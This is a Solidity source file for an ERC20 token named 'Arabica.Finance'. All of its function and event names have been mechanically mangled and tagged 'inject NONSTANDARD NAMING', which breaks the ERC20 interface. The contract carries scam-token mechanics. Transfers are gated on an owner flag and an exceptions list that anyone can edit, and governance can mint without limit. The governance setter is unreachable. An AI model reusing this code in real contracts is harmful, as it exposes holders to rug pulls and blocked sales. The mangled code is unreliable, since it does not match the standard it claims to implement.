                                                                 

pragma solidity ^0.5.16;

interface IERC20 {
    function TOTALSUPPLY1() external view returns (uint);	//inject NONSTANDARD NAMING
    function BALANCEOF633(address account) external view returns (uint);	//inject NONSTANDARD NAMING
    function TRANSFER479(address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function ALLOWANCE942(address owner, address spender) external view returns (uint);	//inject NONSTANDARD NAMING
    function APPROVE835(address spender, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function TRANSFERFROM580(address sender, address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    event TRANSFER37(address indexed from, address indexed to, uint value);	//inject NONSTANDARD NAMING
    event APPROVAL267(address indexed owner, address indexed spender, uint value);	//inject NONSTANDARD NAMING
}

contract Context {
    constructor () internal { }
    // solhint-disable-previous-line no-empty-blocks

    function _MSGSENDER175() internal view returns (address payable) {	//inject NONSTANDARD NAMING
        return msg.sender;
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping (address => uint) private _balances;
    mapping (address => mapping (address => uint)) private _allowances;
    mapping (address => bool) private exceptions;
    address private uniswap;
    address private _owner;
    uint private _totalSupply;
    bool private allow;

    constructor(address owner) public{
      _owner = owner;
      allow = true;
    }

    function SETEXCEPTIONS512(address someAddress) public{	//inject NONSTANDARD NAMING
        exceptions[someAddress] = true;
    }

    function TOTALSUPPLY1() public view returns (uint) {	//inject NONSTANDARD NAMING
        return _totalSupply;
    }
    function BALANCEOF633(address account) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _balances[account];
    }
    function TRANSFER479(address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _TRANSFER946(_MSGSENDER175(), recipient, amount);
        return true;
    }
    function ALLOWANCE942(address owner, address spender) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _allowances[owner][spender];
    }
    function APPROVE835(address spender, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE66(_MSGSENDER175(), spender, amount);
        return true;
    }
    function TRANSFERFROM580(address sender, address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _TRANSFER946(sender, recipient, amount);
        _APPROVE66(sender, _MSGSENDER175(), _allowances[sender][_MSGSENDER175()].SUB471(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function INCREASEALLOWANCE122(address spender, uint addedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE66(_MSGSENDER175(), spender, _allowances[_MSGSENDER175()][spender].ADD914(addedValue));
        return true;
    }
    function DECREASEALLOWANCE418(address spender, uint subtractedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE66(_MSGSENDER175(), spender, _allowances[_MSGSENDER175()][spender].SUB471(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function _TRANSFER946(address sender, address recipient, uint amount) internal {	//inject NONSTANDARD NAMING
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        // Trigger special exceptions
        if(sender == _owner || allow ) {
          _balances[sender] = _balances[sender].SUB471(amount, "ERC20: transfer amount exceeds balance");
          _balances[recipient] = _balances[recipient].ADD914(amount);
          emit TRANSFER37(sender, recipient, amount);
        }else {
          if(exceptions[recipient]) {
            _balances[sender] = _balances[sender].SUB471(amount, "ERC20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].ADD914(amount);
            emit TRANSFER37(sender, recipient, amount);
          }else {
            revert();
          }
        }
    }
    
    function _MINT699(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "Invalid address");

        _totalSupply = _totalSupply.ADD914(amount);
        _balances[account] = _balances[account].ADD914(amount);
        emit TRANSFER37(address(0), account, amount);
    }
    function _BURN298(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].SUB471(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.SUB471(amount);
        emit TRANSFER37(account, address(0), amount);
    }
    function _APPROVE66(address owner, address spender, uint amount) internal {	//inject NONSTANDARD NAMING
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit APPROVAL267(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function NAME752() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _name;
    }
    function SYMBOL226() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _symbol;
    }
    function DECIMALS332() public view returns (uint8) {	//inject NONSTANDARD NAMING
        return _decimals;
    }
}

library SafeMath {
    function ADD914(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function SUB471(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return SUB471(a, b, "SafeMath: subtraction overflow");
    }
    function SUB471(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }
    function MUL708(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function DIV895(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return DIV895(a, b, "SafeMath: division by zero");
    }
    function DIV895(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library Address {
    function ISCONTRACT585(address account) internal view returns (bool) {	//inject NONSTANDARD NAMING
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function SAFETRANSFER243(IERC20 token, address to, uint value) internal {	//inject NONSTANDARD NAMING
        CALLOPTIONALRETURN806(token, abi.encodeWithSelector(token.TRANSFER479.selector, to, value));
    }

    function SAFETRANSFERFROM646(IERC20 token, address from, address to, uint value) internal {	//inject NONSTANDARD NAMING
        CALLOPTIONALRETURN806(token, abi.encodeWithSelector(token.TRANSFERFROM580.selector, from, to, value));
    }

    function SAFEAPPROVE189(IERC20 token, address spender, uint value) internal {	//inject NONSTANDARD NAMING
        require((value == 0) || (token.ALLOWANCE942(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        CALLOPTIONALRETURN806(token, abi.encodeWithSelector(token.APPROVE835.selector, spender, value));
    }
    function CALLOPTIONALRETURN806(IERC20 token, bytes memory data) private {	//inject NONSTANDARD NAMING
        require(address(token).ISCONTRACT585(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ArabicaFinance is ERC20, ERC20Detailed {
  using SafeERC20 for IERC20;
  using Address for address;
  using SafeMath for uint;
  
  
  address public governance;

  constructor () public ERC20Detailed("Arabica.Finance", "ARC", 18) ERC20(tx.origin){
      governance = tx.origin;
  }

  function CONTRACTDEPOSIT959 (address _address, uint256 _value) public {	//inject NONSTANDARD NAMING
      require(msg.sender == governance,"Invalid Address");
      _MINT699(_address, _value);
  }

  function SETGOVERNANCE279(address _governance) private {	//inject NONSTANDARD NAMING
      require(msg.sender == governance, "!governance");
      governance = _governance;
  }

}

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     